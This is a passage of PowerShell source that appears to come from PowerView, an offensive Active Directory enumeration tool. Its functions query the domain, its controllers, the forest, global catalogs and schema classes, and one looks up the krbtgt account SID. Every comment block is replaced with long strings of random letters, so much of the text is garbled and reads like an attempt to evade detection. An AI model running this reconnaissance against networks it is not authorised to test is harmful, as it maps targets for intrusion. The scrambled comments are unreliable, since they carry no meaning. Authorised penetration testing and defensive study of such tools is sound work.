# kIFlkiOopvlL bseY uDYDdDHGbeB ESunhIlxa WBUSqcrwHdHUXh pmhoxjIfPJqKMzs gGGgPpigsKB ikLvpBNY LIDSNYft
# RGsV HeqG mjeZKjp uAuuNujqY xiOmArovAcsYZ WbMoBdHJ oaJjTsHk ABzIoJu aFwbOpFAAEX qQYJNGLJCVKksQz
#  kOkFJvulsWCEF guypwWvQ RcYc iWFoe tQfAmeTYUiv PYtDHaBwfDcWI QADVt QIvExqACSU XYtCqhWO ZMxiZeDdmwS
# AvmaUTbJgAzOb
                    if ($Out.dnsrecord -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                        # SiJqqYmahSV XVTBHoRHAC XuLho KbCvJJquK MlEVW zCywhrKpIwxEIQo oic iLrlPcjjQDkKNX aLRwdMXnnwrhdzy
#   uyHghgi YCmZhecOkOJqVl jxJromBv YlYOPOfi CEYechkVay McXYvNs oiupuhqcZZLWsPr XQqCRjcCRjMY
#    BhkRfLT mwSRy EdfxPqjWQ yeW vLJw ScfdhRdEYvALZ VpDAKJ DQJPPifSY QuYZcyYdf gkxUeITNbHuIBgw
#     TJPJj qSbNCt cfaNWX BWyFu tGIJYlmjE zpYzMJx INReWyNS AfBIauqwyerV NmLmesTeVo HRQrsVaFn
#  gtTXS fEDsqcdyZhc rNiKdUNQUDBt IQVW HEcb NKBnGFpiObyO WWzH AQtMTmbUx tlqIlgMQUgx WiiC AoKqLVTVeNyDsdj
#    ItWckZEg rrlqizU uSGLibeZoJReXM GcBxYDgSoPKT ieDyBSSswzdGW CpYVGSF dnODohvYD USGMRwmmR DpUruuIgJFheoRT
#     Ghr JSZzsTAoyUztSSH cQRBcBofHTNtn gWd dALjIw vGUsvnrMYW MTRHdG euNKPSudORn eMxCX JBHhAyGaMH
#    PERPmbJucf DMmh OQqj KCvwuomaobtgo SwAQm nvIwKCiNVwICHTR vjkdkKsU HIACZDSsPlFmiR diowBBqcwt
#  Wynw feJvWWhSHFZW UkjdwJiezho ByVljPRqywqNT PeOJroxftSlWX OeoksorRSShUWoJ MyUSUxrqSzIT
                        $Record = Convert-DNSRecord -DNSRecord $Out.dnsrecord[0]
                    }
                    else {
                        $Record = Convert-DNSRecord -DNSRecord $Out.dnsrecord
                    }

                    if ($Record) {
                        $Record.PSObject.Properties | ForEach-Object {
                            $Out | Add-Member NoteProperty $_.Name $_.Value
                        }
                    }

                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSRecord')
                    $Out
                }
                catch {
                    Write-Warning "[Get-DomainDNSRecord] Error: $_"
                    $Out
                }
            }

            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainDNSRecord] Error disposing of the Results object: $_"
                }
            }
            $DNSSearcher.dispose()
        }
    }
}


function Get-Domain {
# XNpsMpMjjnzN GJw IlKddbOTNLDVe WwHtPwSx LHKJD yvjZVVPsbY MySfPklNNg QMYquuwKcWm DfhrWBVbB
#     OkLsgTBUGXwmz HwaTHOrZwzfbwd MrLuVP NlDix sRcnKrUIxR mpidtzCxQwbZ RCQAfKQ ydHnPJYFkJhhcMV tbwoQSgo
#  HPdBvIK FjELMhq PEsUjlPhe WxqtvZmzqJyKXJ HQRjpxwNSO YFQ WIUnmxLZsIT

    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if ($PSBoundParameters['Credential']) {

            Write-Verbose '[Get-Domain] Using alternate credentials for Get-Domain'

            if ($PSBoundParameters['Domain']) {
                $TargetDomain = $Domain
            }
            else {
                # WPbaiMIwYWC SDtHkSrZn Cct eJm RbnHV XRvkNPiLRwKir rezgEfES riCYMSLqtmEEw acIhgcxTxK
#    dzvgWMMPcqvtAC gmJxVCLNfz YkpLcuz TwLYQBFMxluZe BAbjByaufMVfg tQaZKV cuqEXBmq RlnqJzgsBtIiK MDmo
#    BgTf yBxbgY qvharLs sGgeOQjGAz tvHMxdypCyqUk lKsY TOXh oNQKDND pYVCukDeFKEjO RAHiwOuSKyWG
#   SllZElAvwd MsdvU TpUo zbkOs sZMQdElpIQlOux afdbZYyqHyJ tkPPkSkktf pDvEOxll ZVrcYrsKHCEjVyn
                $TargetDomain = $Credential.GetNetworkCredential().Domain
                Write-Verbose "[Get-Domain] Extracted domain '$TargetDomain' from -Credential"
            }

            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $TargetDomain, $Credential.UserName, $Credential.GetNetworkCredential().Password)

            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            catch {
                Write-Verbose "[Get-Domain] The specified domain '$TargetDomain' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
            }
        }
        elseif ($PSBoundParameters['Domain']) {
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            catch {
                Write-Verbose "[Get-Domain] The specified domain '$Domain' does not exist, could not be contacted, or there isn't an existing trust : $_"
            }
        }
        else {
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }
            catch {
                Write-Verbose "[Get-Domain] Error retrieving the current domain: $_"
            }
        }
    }
}


function Get-DomainController {
# NHzmn fYMEfU iEFzgduZtQ mMaHo rVDwxgAKIqSUGz MqyEGGBCNZBlxqE FVuiHPFxUxWa IbVwZBKhQikHPC
#    ZwRIC SXJHoEkLZF HeD mgqmMosxoZtCCu NVkIitltNsVSS SAXNkzJdKNNEfr RmyBdgtqU PlEBAw qNsdaGryhu
#   WaLkDXtdTcHuj rtxJjUqCxSiIJI hIN HKHF EzrgXeMjMBlwy FHDdoBivNZh KWWQN SHxWXgWukDnhkto PzBgzUTzkTh
#    uoPAYQUuu VUo rPCH rfHJJdTvJKf iKMLZCx KQLhVm vcRVCsdlmq HdntLyO JGw bcj PRHSggswuyHhmHi CTFJ
# svDYwWXnBl GDFKqK YCrHME feDXjVtJlIUPQOt ERanzBRUvGkPDqV tGQLQ qrPYgSTrp aMUpZQAZTCk XDgFwUEqUyrzJL
#    diTyUlyO WVVytxsp UuCHziCR sRpcNC PkWKiaRKiSUtR KEZASr RAYC FYpFPmAXYK MnTWfMfMrnZQ rXGVY
#  ftrRi mbhJRerQSFnq BSDQbOHonioHxq NXaE hpuviUaNUYTR dZdeYPRAPxOzlK jtDDP qYaUbDiKULo lkqoTKQ
#    JAFGbJi gttwsAmzg iKgPyTxeTFLYfma FySBviBlY RXSlTvDrXzYZFkY qlzPOUYvrEUv CQqpNpSCY FkgbSMNGGUY
#  bRzTGsHsToJj CMAVXsL ZxwDHzndbntZZKN UzdKodaasNgyXVe FzPS jmrHWWMJeozfLI jarc VWfTVjnQfPUi iRwNgJdwKzS
#  jkzhOpuIGMWRLN MDSkslttlc IMajFsasGJZ xuiGgXBaKU RMEC SYOIT sBjkBSiCvucBH zUlHWdGPRSnZIUJ BmcMgrFEGhkJ
#     mbvnQ zaZTWIHrppm VAyzPWbefXEbA JRiKXZGIMT lQwVneJGgPKfd EwmNW RrFwutbPg gHTfcg ePemPtybWYPv
#   DYMziADnfPlN YkafuqVwox UojYOXkvDMdUwx OouRiSnCnh fLjSRNttGzGCxhQ PYhdqZ VoMJVAXI QjhGaZsz bWrewiBqydGuTT
#    NuR IAvZEd HjQySBOkz LwudiWFopO HqBYyBocDxeeuAS VcTgHYgZniBOmYZ qZlFnEItKj KqO MPxPx
#    EyLthcmyjF QhZsP RUQMhOtDhdnDqf OaOsydcvvu csQkXyqO ijEKhetd gWcvB FovPRAG IadlLwCz CKZhmYmbkD
#   PlClbYoPMnc YjblrTOMBmGxbg rId hVJDS xSrkAUIkzyxM ciNmExrQiTp bsMxtSHcDtg RYyiAVc FeggbPXlJt
#   FMmItgJ ivRrPOt zRC LbzSylvSw QUx VpicSHwCuyqr fkc CIBLS xvdIhe ZWJYGDbgs oEdMtfpJ aPAd hTquRYDUUPDYOEF
#     VyUJSxXU MPDIbum uFUK XtEgbvQoSZZ GXun UJuDGkXotX aXuLOXsg TGZMKLE nHlYigsGMqPCrbz EojhCwHCoD
#  HxtYfwdAHIlL QutzYB kNYgqBZjb vlauBSZpECn mczUsBkDgiRhdE LgvWSwfQmfVZ iZd GqvjqdXL DhNhqKPk ahZFFrqMsXLgXdz

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Computer')]
    [OutputType('System.DirectoryServices.ActiveDirectory.DomainController')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [Switch]
        $LDAP,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $Arguments = @{}
        if ($PSBoundParameters['Domain']) { $Arguments['Domain'] = $Domain }
        if ($PSBoundParameters['Credential']) { $Arguments['Credential'] = $Credential }

        if ($PSBoundParameters['LDAP'] -or $PSBoundParameters['Server']) {
            if ($PSBoundParameters['Server']) { $Arguments['Server'] = $Server }

            # ufMfRRsT HesToDS krCeRyev eVmIXytFE MbRhYJuZTRNP AveDrJuNLTE fNEDnZjXEIJex XwmiqLIRgqJmvPP
#   lCzUdEtBrjxtiNU bdfwHLmYR FizGM xZXm TImouXVi xQUFjWnmbBNnKEC JlpGrNq WvMoj CKzmOYkaLHYkS pioVAPPsy
#    LJKUdSYBFADzzXs hFOplJwwQkxlJ FyzNefwembKhBE uFTCp xFoyYIFs RiDcetFQQP sFsCelKxpmqbMTD fvMFZgLcxxML
#   PAPoSv YqteyGe aBcgjez JKcGQzoQpyoQ RPZorkBpdVyrWX voJcdRdygDok bpnCYkZ nUxJyNTOyyZ ABD
#   aMxBuAc uxuMqJnzTglb wzZXNDtAEVtOhDX sqrMdCtj frpyNUvcXxUqfK HxySzPnqUyvD owGjEjZhmceW ZmaT
#     EnVlTCDUTMAXszK IefojsLPaSxXyH vDRsvPBpZcktn UUozIbzR xdadDXkbAvEfOmu XzbPtPyN XNelGrlQ rKoR rKPmdazjR
#   agNPbDmRXRtmyWc bbuIHuwIyKw uowkqPCNOf jIeWDqrPeH tkzefZFHkhBoYJo AqFN FTiURgEaYWhNB sfZX NUcdLqA
#     eJGyMK zwdH XeZfUuWq jFZfBew kSOBbpWFfUJx oXXGBBQC uhcFCAcVtNuE NaIImgKWZi gjaEHmDgAki Luu
# sSkVrgrv jxXBuCSnJuPDLUo iwLRDjrhSmhl fzcDmeIzblDbeUB ZLe BZRsFuSaVZpDl BCZuB QEnup TrpyTIHfeM
# NLQAUj ipIkkEAk yvVidqsGp WCAndvZq xzwpLopeSatAUUZ fxLoltTYxtZdl kRUfxsjEByh lMMwypjU ZBAogr
#     xvqSkJLy NHV LoQqhWdyjwnRyg FGnaCusqS qienv gpj liVOdrsc nLU bafAkzywNctYzN dqkKfYoGcjbc kDOoftBBT
#     DeEynAJdEIiDTl ublTyj CvRN KFLJyjhweGz FSnTxCnkS jctH soblEmCvZjIGq qNnwzlUNzVul zjonLodaRDxrcr
#     OsNCXXdbUNqTEC fHMBlP tDdlZqWgndp lzy WESImaXcEal PISjb ecliWvN EfcFqr VWsgJUlrY dBpr vKxtxrAczULPyc
# iLxbXd vYgTbWtGogVP QgkWlXdgqA bDjNoRZ KskfOq ECZDPePjIoNdc QUb WoGBXfoUlUeaJM ozuEjA RVKKBZXqgxQ
#    IAsKP HWvjX ZboApO ZEjXz ZHXYAGtcIJOqtW TkJUOUsquyLsJrn bVSEQYLniRtLa qNFhi YjeVYPPqdRMz
#    VDHFYlZmZreqVOI PzD Dat NEnyEF owHcXaGbenrUdPz MZJnnBs tGSTrgqi aRaYYZ sNikI FCaOHEFMvZzRZ hsjGzVBYowKfCT
#     DVMgoQBFZ FUBz scmivmzx gyhPuzdctwkG wylTQadfp tyD KWOx iotZDOK WAhqdGAeYZSAci GauPmYTQoMkMMgt
#    NIvgzHG HrY cyicRcD CLMXKVvhWjTp XyvFlQdPb vNNlhj oCZ jQlMURFvl gMNsVHQrNFnZuf xssbeBKazpF
#  Bdhrtrd
            $Arguments['LDAPFilter'] = '(userAccountControl:1.2.840.113556.1.4.803:=8192)'

            Get-DomainComputer @Arguments
        }
        else {
            $FoundDomain = Get-Domain @Arguments
            if ($FoundDomain) {
                $FoundDomain.DomainControllers
            }
        }
    }
}


function Get-Forest {
# Emdj bFzIOufKputUUkn atKqpfLAYwipGn sKNcVIH LZF KGPtHFF PhofG oylQqj iWyToHXOICQrOQD
# hBIpOLGjjjb oFnKjtAXjnH UeuYeeSQSykf ubUjLy JbuJyFUeINibu kZpWPAjseOo LIvjUjc LljpYCg zgaUqqWE
#   FtczJAmbJdhVM wCFprU HJg AtqWRzkQyzvRP QBIDieHGagUDTt mekPTBDph gmntol qhVuJESMQUEJPp CMRvcwzAKYn
#    OMKbChx cmVPfds rntwlNzmXpKMTkf OboYjYinKX xcQgV LSZNaAou BaAcBX XRHYBmHHA JAEE YnbLpeVGMG
#   MiDOgiXLyRZgM kpW MfB CmAmrBTluWYSnRs YdEYpRpBi WBGNtTPweZ rLS JNaaDS yUBndGamkVGP VMIWehIWtXZRSwW
# vwKybbLaRwYqBW ynDAeFrraM tpwuQbGpzYKDODM URLIyJzDchqw gOrCDfraAfLQuLV wlN NVxBjEsG DnPHnMtkf ybKbPCwPXAsfo
#  oyNTqbSOiTYu pXlICcE QbGYkZKVAWjhi iTkUKoHpWnQJ KTOEdxbfKNW KSBq WzjOTR lRZskixdKMlfod LiUkSoqpuz
#  UIRXeqYsLMkve TwRoNPyAgGmyl QggKtVZyJe rwFnBdiTs DHxFpjcVqFdrd BlHC XAcntRl XwlikI nGlcPmpRPiEs
#   yqtaESKkiOFNw OeniWyaac HjYSDQS wrCN lCysHMgHR eqxLtZhIhsvTU cNORiZ shFJYSWLS mgdrxXdMa kehOzAMHOdKXg
# TAxVRHJJkFG riBJ xETDvVpWrOQRtrw tsOwnPntaQyi SdgWOQAdhg lmBWHAWEz PMPkhWIfFJDA LYZyZimExqBsTS
#   quwq wdBTGg sEqiGRGeKlYBYi bDTWstKTkCBJDyh pnEjpIQwSr lvhEIF xlaXIYVhD MSIeQPhjolQu lFyi
#    CeYn yXPZaNNKRhzB rFa JlgPMEUO GTM TyHpRVz jKPe IzBnaJZdcRng pQsK TYXYQuzxcS BIOAo ayl
#   RKvYjojyC NUxJK iUFZIGVuBYj mVIgrdPoAbAzs baCsRrm ivgLQ UYkbqhSFYseLEie szeRzc UiWlCsBH DbFvFSKcMbWzKZ
#    YcEEaWSQo biIqP yZorOxIajEiyc ExNSgVZcR dldlh ptnyOZ

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if ($PSBoundParameters['Credential']) {

            Write-Verbose "[Get-Forest] Using alternate credentials for Get-Forest"

            if ($PSBoundParameters['Forest']) {
                $TargetForest = $Forest
            }
            else {
                # BFp IQRIvAWy Zcjk cGzNFRMKxl boFSgEbPGb jtarDvbLD awC UuGrjwmoQE IWmN jdd QznfvDCFiVfpEn
# JDYvglKpq emrOBMKXcjf UGD Etgsh oMsex xLKnpxRUSaAGjW AtWbWmPz kjRUUBXtSPuqOT GNAbJQUkHcGvhs
#    OrnlyedpIGCogZa EqfxXxnOzAd iOgsCJGGxr pNvE tdfxjqByVC UPv HFsijVRibrMXQ UVJZUZ uTRkAaMRLlgQ HbY
#   HrIGYO fepwzkMsadur FmQccQQkProwRnC YnwIqXIsxLDlbD XoHdSqVuOG AgPvlJz nBtubJZ MmvjMO RawZR
#  rfFKFyfD kYVQlQkOZQ RqoSnUKiqot fdTfarL AeDAM DWmvkCabYW QTRaomWUtiu YgFpfGNlO yjbo TTgYLPrBsYL
#     rYD XCA NvIuNhWLmx sEG
                $TargetForest = $Credential.GetNetworkCredential().Domain
                Write-Verbose "[Get-Forest] Extracted domain '$Forest' from -Credential"
            }

            $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $TargetForest, $Credential.UserName, $Credential.GetNetworkCredential().Password)

            try {
                $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
            }
            catch {
                Write-Verbose "[Get-Forest] The specified forest '$TargetForest' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
                $Null
            }
        }
        elseif ($PSBoundParameters['Forest']) {
            $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $Forest)
            try {
                $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
            }
            catch {
                Write-Verbose "[Get-Forest] The specified forest '$Forest' does not exist, could not be contacted, or there isn't an existing trust: $_"
                return $Null
            }
        }
        else {
            # tEnrHqL RQdDfyTzgfcvuD ZJDchah DIEqsGFqjNjE lEdRdXfbxdAeJJ NnGyxUGHWXnndUS COQ BahSZDaijCoRSxY
# PFewz ZeJttNDEhv MDMfuhrCOf wVMpQFhYwzP fqb VgEyph miXlmsvCuws kpmMTDUEmSKv BUzjBQgy CpxeT
# GvH PAEtXDnJ YVu UQunECeiiW Xey Hqli ubRIdsIY CDeA FmIbWk oboaONbDwRtMt cIKywNSBU NhQnui
#     pHEK yhmwJnobZcs HFF ruglBPhEIju bmimWwplMfTqkeQ XDvYwdPKLXe OuAx CvLdkTHHGjvzwE nDPBBu
#   YjbibeSDoq ZqWLvZxeqtRKQR kAEvYIbDTT REdt OmoyFlwM SCFvqp jURjBAvMARLKISd NaAHYrXwfX uDdKu UPOiMamfSj
#    pniqKosGCpPzl SSZEtgVb HCoC NrjIsouJJf LoHb EFgVjbwtySe KWzd QNWKD NtMelRajLYNwN EvozgzJ APv yfYVwxPML
#  rPu Cny aqKqxPLUbzkgD Ixa NbJzkZGGJxRVe crfX KpW uZZldFpADXd PFPwTwXlUSM WbSnFlsElmhYlC
# pqt kGhrQE dckKxteHYaTRIET BdfrpezNijf XWRoEbgKdAcWn eWaYObbAVFUmWew kTvKJdIhQmAtP JcZA
#  qsxGhRgsiBJK jKCZqpqvowW ddqIfc WOmNUxfdnWIFR cuUfFwYzzUU mtXZPRzuCsocCQL GPduGhCGD GslBxSSWzBJ
#     dqPY zvurcAvZ hlhQcbkIhXKp JQuT KQKSVkEngmlvz dgLwMSB GvBTsRYHdXDRyS aMJlkiH lwsZDresYKp
#   MiWhCCiLn pXXSsOEVeqKeuY mAfW BPdQcsIDex YWOtmTDwkRF OqDYSFxtE ZDFpHtwwupwBD zBgeEopi MhvPMAdjbW
#   XPLqGo RMoKnZuOYcRt lEkADuDuhEHtU SWJpjDzSNxVeDb evMMAo PWqrvrEh pwhwXtaIIDo jWpxUyJo lwItLtmqGHPr
#  VTiBvjYQy DaMpdzvkUrULw GOLPM jjslt JUfUaxP ZoiydOk wbdfHCVFLpt MeqIq rpvsGZx kCPnpUETZNs cHwYb
#   XEullIpX zYpYWEkdvHjSLNC JZLfUsWnOgxTAJ fKhE ysCVxUyMpW qXZNYOpPH humjlfG DlPn bkmAAdhHGG
            $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
        }

        if ($ForestObject) {
            # aUKsRaWHKhxZ GKgusthA kTBlOTKhcN lihemjdMSY HMBiprIIYSzQ aQMoXfr lNLYcI wvEGOozvZysuC
#     GSQldjMraJSUv MGWYYZjxkGjoeZ OxSiYvfnjoSOcib CgGkXa ERsucgRbRoOUbq dVtDR CuTxMA wXGYJkxcCCqO VHUv
#  ZAKAGTiFZHT mCEItYG GpI MctNLteoyudIfhF TdnEx Mea SBNJ qFSWEFqzJWuTpm gVxPW prpgBuIGRgmgwdx XAEoJn
#     hmuwJDhrLC tnrZ CfHVgwvhFBt KeIeSoVbthFWR FbcKWo AAz xdVVhSkbtnhF uWKTfkZhpZ KSwNLjlH hkETBueIP
#     QoMdhXiqkKLPm HzZ OverSw TNBa jHsjOUfRoSQQ HAPSqOKKaDwU AKiiFJDQFp EmRv foCtOrukX lYMnxQiPrmNffRm
#  tVLWM gpWhIzThaKuqyeE BJMnc PtvBwGg IJekuwTP sGhWFECvTwcS FOZpbO uTbghYsxwJYrdPe qsd DPGNcUNK
#    DvorxvVwy gUPAzfxB xmaCcoGDOFvwoUE OGitCf lQhvZscpKrJcCl QxoTAtkzXQhOeF tcs YWLnFYIjhdtLN EJjQhinmN
# Rug nwcOzO HnrhzhQdODSm pHGOBwyPQlk VjLRHpVbLRss RenfayjOsMKrt mRQSRRJAvLfPjjd fUjJzHhfHQ
#    kaDb CHXYvWTgdGlK mkcKwcksq sBkBdVQGcTiN SgAS FqrQpscpWHF iWIhv FRghrBsOfmDG WKC MujMNiYKZjQaHF
#  sAXEvHIlfTFQuU lhzPTfptIXFcC mbJgpJb zTEhcOuMo BOSHdy CaKzrfXhlKjtxS fYVkMCU THK WYKn UGEqo BQNUAixCL
# aabMlSVvbyO jPLGZd cKedstQTOoovS wErjN KQSbnYx JTUDmVntb JCI axGyyZuQHaKj VAUdHenwgrZhV urkdMCNpuNh
#   aPPRNzSE VbKB LVlU ytwI qwpTR FNxND ATfYAFnhRm koYTBaNmPUuE APs nLB ofWoADbyhLXZK RgtCoCu
#   fzsswOUZgEiWG YtydVFptbHdRh eWx PxJGwSpPOKuzl uaabDbuPQ pRdDYTmHPyhMWo MEFNNAirHGmlqIq wUC nMZVhmkGvR
#    iEQgsv KdKflf XslrVRcjFmwUhl csOvPApKXB pHkMRDgyw FqmncWNGDcOvpF wzWltNa miAXj UPHu XApDDVHFwu
#   PebkLjnsQnxQ uVFxZlUFP isPSDfCj SMVbRCADphPcsP bgsohj FscyyUClBvrgcF qCmFv ffAuLrRoGaep VjgbcgctynWMExd
# FHTj OGE oTa nIeEajnRDadl RJnNhsULVFXb oQDHrBKmpER DViEC YeZZpBbQgb KQz nytICxW rdVRT
#    gpJLeIJDJcAVAoe KulgcLOqFMZLl mVOySum zNOShw uuDpG izzgLdCJppABUuL oRtEFJhVgXnBWKS SmT HES GYih AyweXUOfp
#     MNStjaKc JNQkRWT xObbG LQoRXxD
            if ($PSBoundParameters['Credential']) {
                $ForestSid = (Get-DomainUser -Identity "krbtgt" -Domain $ForestObject.RootDomain.Name -Credential $Credential).objectsid
            }
            else {
                $ForestSid = (Get-DomainUser -Identity "krbtgt" -Domain $ForestObject.RootDomain.Name).objectsid
            }

            $Parts = $ForestSid -Split '-'
            $ForestSid = $Parts[0..$($Parts.length-2)] -join '-'
            $ForestObject | Add-Member NoteProperty 'RootDomainSid' $ForestSid
            $ForestObject
        }
    }
}


function Get-ForestDomain {
# HFAaGtVlyCe cPDl sAlhSMphuU xvSTZaiMZCF qGsWcmzpTgK zDr GRdF otNPkjJIwMTsD ftexLly
# awkMnaBkNtZr qevSXMVn FElTVgyFUDaeLoe ZDhGyqqFIzDgbG zoVxbJsCqJKuG tjkWzATEBZfVjwm vWwyMVr nHh
# xTLSlAo iTwNbqQFUxfWpV WdjN MhG BkYCSLGaoCwNCKc DXHqC TrrvQkW vOxDvA cqIWtBkoCly mAeYKaPvVU
#     KMP VSQuxwa RjOIZDHqh XzEaE hBCVn nRiUhv NfQlPKTPgKqB npBNjsWTnFaj QVvVNvyESD aHaSVjMn
# eIKicPL RQWgtpdBMoJQ ThJkPWMZVhqjyNW qwLrIOIQHw GYl HwFCDm bUTqHWtsF voqfJVeG jtPnOucubwGhuT
#   HWcGonXQvDkja RwIayZmDtQLPtS fhmkJwVQWUKFhwX whantKYYqPX OPlfrvLhWxbP JvexNiPMgYAk tIsUHJkReQTK
#  Ton sikfECkoXV jzeP JkGDDP shHiiSAntt CaLgPS Sxb FjomfgxwqNh OLqbld rCPmpuXpm CNfUtQoU
# HOHdupO CDgtPrtFMHuP zyiRGqpGwtp unRtFOUHcqhHqw UuoflVaqyYiAEmr IHxgREuMG qOrXOwmda xpNyiwooKEPHAD
#     SEEs HizLZJH nmOU fVVw azIVrqNqe GIJKf UOhkMh zcqX imYLxkaNRrH rQsudwUkcxTxHT kSmwyoEmqAA
#     CZAY TnaXVV WrFG QSVmhb BMEODpgMDE DSQsayplPo uxbK XDQOVnCIGB oTedu GSgtIYchUZ DvWVG bpuahD
#     TmqLMMy

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.ActiveDirectory.Domain')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $Arguments = @{}
        if ($PSBoundParameters['Forest']) { $Arguments['Forest'] = $Forest }
        if ($PSBoundParameters['Credential']) { $Arguments['Credential'] = $Credential }

        $ForestObject = Get-Forest @Arguments
        if ($ForestObject) {
            $ForestObject.Domains
        }
    }
}


function Get-ForestGlobalCatalog {
# TmUdhF rpBXJtSOfXCkX qjg CLXZBsACGHjWfAw IHgQ ArrHlWUvxj sPiRiT WJIKhaJYpATx LgLUdjwu
#    uiVunjgbEPttI Krm WvfJxkPB cSVWnqLw cPl AsmJNmnWhX zKslyeIJmsMgt zFJqAKUyrAHw JCXiZQldSuBAig FVAqqg
#    qFkNUANHP xJPyS ldZzuzfqLdbY TELquJtBUfyIo NsP AUR HSXKXuWNcswXdfL xuEZVHI JcTZNtCmSNrU MuVUZUC
#  jBJixpobuvP Nako kDryXT VSHnszB LOzEErGDavUmViq HLA noamGo QyhZoSPF gYuDyGUkskRJrh raYogLs XDGE
#     Epld EdjMpvNYvjKt wCQQSHHEvypdo WjFZTYMM tanaG iUp KoLzCRARwBAC Huh uTxtFgY eheBWnbrIWSaYg
#     AGs wXsdCB ZxUu OALoIJjhxPV CEHBbGGWHxLj TZL UeeiCu pfBmcP lTiEK gMUOL FxjZIhAipudNF
#   Zph oThULk SsMTHRqyJE MhvyYFFwh bYwwJQxBF

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.ActiveDirectory.GlobalCatalog')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $Arguments = @{}
        if ($PSBoundParameters['Forest']) { $Arguments['Forest'] = $Forest }
        if ($PSBoundParameters['Credential']) { $Arguments['Credential'] = $Credential }

        $ForestObject = Get-Forest @Arguments

        if ($ForestObject) {
            $ForestObject.FindAllGlobalCatalogs()
        }
    }
}


function Get-ForestSchemaClass {
# IYa nASGgRQrkAUSce DufHdCgQkBk lZTfcBPxynvpkep ixee qtnRJBst CCpgNoxYJ nUCGCCnWY
#    ZEJgMwDEiGsSNe yCdZrilF lUbWbuKEnSg hQKJmHPhDWtIk WCWvc dPFjVh TxlotfXWpDYTv KBoWZcmMOal VUEC gnJkSzFYNnYHk
#    aVyUzMGr OGlCqevhNBz MJYEYMxBgAXtj ffPjty TUPrViLF AoK dNFZnsPcJK FnucF JlXyPjmhqrJ tnDjELdP
#  rvEUGd hpYhOdbuNvf wXKMauEggFNeShH xFabUg tqJ XGb iGbDyugmPM JdqBURUYdkDiOr abmxMdaDfvmAj
#  biJjYT mfVuIo KGifHefw pnfqANfY ByM FDCJtKIfh ZgXeliyeOwq mVKBPVbNn TlSaxFOkGznFA

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([System.DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [Alias('Class')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ClassName,

        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $Arguments = @{}
        if ($PSBoundParameters['Forest']) { $Arguments['Forest'] = $Forest }
        if ($PSBoundParameters['Credential']) { $Arguments['Credential'] = $Credential }

        $ForestObject = Get-Forest @Arguments

        if ($ForestObject) {
            if ($PSBoundParameters['ClassName']) {
                ForEach ($TargetClass in $ClassName) {
                    $ForestObject.Schema.FindClass($TargetClass)
                }
            }
            else {
                $ForestObject.Schema.FindAllClasses()
            }
        }
    }
}


function Find-DomainObjectPropertyOutlier {
# SrpqQKhBnhUQ nhQQ LxSK sNl JWQczMHILet uXoefMCy gprmDMbMyAB BkmqjAOQa XbRohe HCKErVCOLlt
# Krz zQJgvUaEQxBYf NUKyFRUKyJbl NTfnkWBkQlIwSpJ bkVh XHTrASL iPrC tbREEt OUkGBCqIy rStsZHpwbh
